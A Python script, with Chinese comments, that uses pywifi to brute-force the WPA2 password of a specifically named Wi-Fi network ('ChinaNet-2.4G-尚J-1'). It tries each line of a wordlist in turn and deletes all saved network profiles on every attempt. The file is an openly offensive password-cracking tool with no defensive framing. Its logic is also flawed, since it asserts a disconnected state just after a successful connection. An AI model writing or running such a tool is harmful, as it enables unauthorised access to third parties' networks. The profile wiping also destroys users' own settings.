import time
import pywifi
from pywifi import const  # 引用一些定义
from asyncio.tasks import sleep


class Poji:
    def __init__(self, path):
        self.file = open(path, 'r', errors='ignore')
        wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = wifi.interfaces()[0]  # 抓取第一个无线网卡
        self.iface.disconnect()  # 测试链接断开所有链接

        time.sleep(1)  # 休眠一秒
        # 测试网卡是否牌断开状态
        assert self.iface.status() in [const.IFACE_DISCONNECTED,
                                       const.IFACE_INACTIVE]

    def readPassWord(self):
        print('开始破解:')
        while True:
            # try:
            myStr = self.file.readline()
            if not myStr:
                break
            else:
                myStr = myStr[:-1]
            bool1 = self.test_connect(myStr)
            if bool1:
                print('密码正确:', myStr)
                break
            else:
                print('密码错误：', myStr)
            # sleep(3)
        # except :
        #     continue

    def test_connect(self, findStr):  # 测试连接
        self.iface.disconnect()  # 断开连接
        time.sleep(0.5)
        if self.iface.status() == const.IFACE_DISCONNECTED:
            profile = pywifi.Profile()  # 创建wifi链接文件
            profile.ssid = 'ChinaNet-2.4G-尚J-1'  # wifi名称 ChinaNet-2.4G-尚J-1
            profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
            profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
            profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
            # profile.process_akm = const.AKM_TYPE_WPA2PSK
            profile.key = findStr  # 密码

            self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
            tmp_profile = self.iface.add_network_profile(profile)  # 设定新的链接文件
            self.iface.connect(tmp_profile)  # 链接
            time.sleep(1.5)
            if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
                isOK = True
            else:
                isOK = False

            # 检查断开状态
            assert self.iface.status() in [const.IFACE_DISCONNECTED,
                                           const.IFACE_INACTIVE]
            return isOK

    def __del__(self):
        self.file.close()


if __name__ == '__main__':
    path = 'files/wifi.txt'
    start = Poji(path)
    start.readPassWord()
    # c = start.file.readline()
    # print(c)
